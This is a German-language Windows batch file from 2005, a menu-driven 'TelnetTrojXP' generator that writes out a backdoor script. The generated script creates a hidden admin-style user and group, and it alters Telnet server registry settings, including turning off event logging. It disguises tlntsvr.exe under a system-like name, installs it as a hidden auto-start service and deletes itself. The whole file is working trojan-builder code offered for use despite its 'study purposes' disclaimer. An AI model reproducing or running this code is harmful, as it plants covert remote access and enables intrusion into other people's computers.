:: TelnetTrojXP (Original Code) by heroin
::
:: Code gepacht by Mr Hawk
:: Dos-Gui by Mr Hawk
:: [BAD R.A.T.]-Company
:: www.bad-rat.de.vu

@echo off
goto $start$
:$start$
cls
title TelnetTrojXP-Gen 1.0 by Mr Hawk [BAD R.A.T.]-Company
echo.
echo  ษอออออออออออออออออออออออออออออออออออออออออออป
echo  บ                                           บ
echo  บ             TelnetTrojXP-Gen              บ
echo  บ               Version 1.0                 บ
echo  บ               by Mr Hawk                  บ
echo  บ                (c) 2005                   บ
echo  บ                                           บ
echo  ศอออออออออออออออออออออออออออออออออออออออออออผ
echo.
echo.
echo  =============================================
echo   S   = Start Generator
echo   T   = Start Telnet
echo   H   = Help
echo   A   = About
echo   W   = Web
echo   D   = Disclaimber
echo   E   = Exit
echo  =============================================
echo.
set /P cmd=  Bitte waehlen:
if %cmd%==S goto $start_gen$
if %cmd%==s goto $start_gen$
if %cmd%==T goto $start_telnet$
if %cmd%==t goto $start_telnet$
if %cmd%==H goto $me_help$
if %cmd%==h goto $me_help$
if %cmd%==A goto $my_about$
if %cmd%==a goto $my_about$
if %cmd%==W goto $start_web$
if %cmd%==w goto $start_web$
if %cmd%==D goto $my_dis$
if %cmd%==d goto $my_dis$
if %cmd%==E goto $exit_tool$
if %cmd%==e goto $exit_tool$

:$start_gen$
cls
set a=windir
set b=regkey
set c=0
echo.

echo  ษอออออออออออออออออออออออออออออออออออออออออออป
echo  บ                                           บ
echo  บ             TelnetTrojXP-Gen              บ
echo  บ               Version 1.0                 บ
echo  บ               by Mr Hawk                  บ
echo  บ                (c) 2005                   บ
echo  บ                                           บ
echo  ศอออออออออออออออออออออออออออออออออออออออออออผ
echo.
echo.
set /P localgroup= Localgroupname eingeben         :
set /P newadmin= Benutzername eingeben           :
set /P mypass= Passwort eingeben               :
set /P exename= Servername (ohne *.exe) eingeben:
set /P endung= Endung (z.b. exeÿ) eingeben     :
set /P scname= Servicebezeichnug eingeben      :
set /P scdic= Servicebeschreibung eingeben    :
set /P outfile= Speichern unter (ohne *.bat)    :
echo.
echo.
echo Script wird erzeugt...
echo set regkey=HKLM\SOFTWARE\Microsoft\TelnetServer>%outfile%.bat
echo net localgroup %localgroup%  /add   >>%outfile%.bat
echo net user %newadmin% %mypass% /add   >>%outfile%.bat
echo net localgroup %localgroup% %newadmin% /add  >>%outfile%.bat
echo cd %%%a%%%\system32 >>%outfile%.bat
echo ECHO reg add %%%b%%%\1.0 /v TelnetPort /t REG_DWORD /d 00000016 >>%outfile%.bat
echo ECHO reg add %%%b%%%\1.0 /v EventLoggingEnabled /t REG_DWORD /d 00000000>>0.reg >>%outfile%.bat
echo ECHO reg add %%%b%%%\1.0 /v DisconnectKillAllApps /t REG_DWORD /d 00000000>>0.reg  >>%outfile%.bat
echo ECHO reg delete %%%b%%%\1.0\ReadConfig>>0.reg >>%outfile%.bat
echo ECHO reg delete %%%b%%%\Defaults>>0.reg >>%outfile%.bat
echo copy %%%a%%%\system32\tlntsvr.exe %%%a%%%\system32\%exename%.%endung%>>%outfile%.bat
echo attrib +r +h %%%a%%%\system32\%exename%.%endung% >>%outfile%.bat
echo assoc .%endung%=exefile>>%outfile%.bat
echo sc create "%scname%" binpath= "%%%a%%%\system32\%exename%.%endung%" start= auto "%endung%" /service >>%outfile%.bat

echo sc description %scname% "%scdic%">>%outfile%.bat
echo sc start %scname%>>%outfile%.bat
echo del %%%c%.bat>>%outfile%.bat
echo.
echo Script wurde erfolgreich erzeugt und unter "%outfile%.bat" gespeichert.
echo.
pause
goto $start$


:$start_telnet$
cls
telnet
goto $start$
:$me_help$
cls
echo.
echo.
echo  ษHelpออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
echo  บ                                                                    บ
echo  บ Localgroupname      =  Bezeichnung des Gruppenname (z.B. Telnet)   บ
echo  บ Benutzername        =  Benutzername für den Server (z.B. admin)    บ
echo  บ Passwort            =  Passwort zum einloggt (z.B. Pass)           บ
echo  บ Servername          =  als was soll der Server laufen (z.B. lsass) บ
echo  บ Endung              =  es kann jede Endung sein (z.B. exf)         บ
echo  บ Servicebezeichnug   =  Wird als Servic gestartet (z.B. XPT)        บ
echo  บ Servicebeschreibung =  die Bezeichnung dazu (z.B. XP-Telnet)       บ
echo  บ Speichern           =  Speichername des neuerzeugenten Scripts     บ
echo  บ                                                                    บ
echo  ศออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ
pause
goto $start$

:$my_about$
cls
echo.
echo.
echo  ษAboutออออออออออออออออออออออออออออออออออออออป
echo  บ                                           บ
echo  บ             TelnetTrojXP-Gen              บ
echo  บ               Version 1.0                 บ
echo  บ               by Mr Hawk                  บ
echo  บ                (c) 2005                   บ
echo  บ                                           บ
echo  บ          [BAD R.A.T.]-Company             บ
echo  บ            www.bad-rat.de.vu              บ
echo  บ                                           บ
echo  ศอออออออออออออออออออออออออออออออออออออออออออผ
echo.
echo.
echo             ..::Batch is power!::..
echo.
pause
cls
echo.
echo.
echo  ษFeaturesอออออออออออออออออออออออออออออออออออป
echo  บ                                           บ
echo  บ -Startet Telnetserver als Service         บ
echo  บ  automatisch mit Systemstart              บ
echo  บ -Tarnt Telnetserver                       บ
echo  บ -Erstellt Rechte                          บ
echo  บ -Script loescht sich automatisch          บ
echo  บ -Script ist kleiner als 1 KB (ca 750 Byte)บ
echo  บ -nur 17 Zeilen Code                       บ
echo  บ                                           บ
echo  ศอออออออออออออออออออออออออออออออออออออออออออผ
echo.
echo  ษTHXออออออออออออออออออออออออออออออออออออออออป
echo  บ                                           บ
echo  บ THX an Heroin fuer den Originalcode       บ
echo  บ                                           บ
echo  ศอออออออออออออออออออออออออออออออออออออออออออผ
echo.
echo.
echo.
pause
goto $start$

:$my_dis$
cls
echo.
echo.
echo  ษDisclaimberออออออออออออออออออออออออออออออออออออออออออออออออออออป
echo  บ                                                               บ
echo  บ Dieses Tool ist fuer Studienzwecke geschrieben wurden.        บ
echo  บ Der Autor distanziert sich von jeglicher Verantwortung und    บ
echo  บ Haftung fuer eventelle Schaeden und kann nicht belangt werden.บ
echo  บ Jeder User ist selbst verantwortlich.                         บ
echo  บ                                                               บ
echo  บ (c) 2005 Mr Hawk [BAD R.A.T.]-Company                         บ
echo  บ                                                               บ
echo  ศอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ
echo.
echo.
pause
goto $start$

:$start_web$
start http://www.bad-rat.de.vu
goto $start$

:$exit_tool$
echo.
echo THX for useing this tool
echo.
exit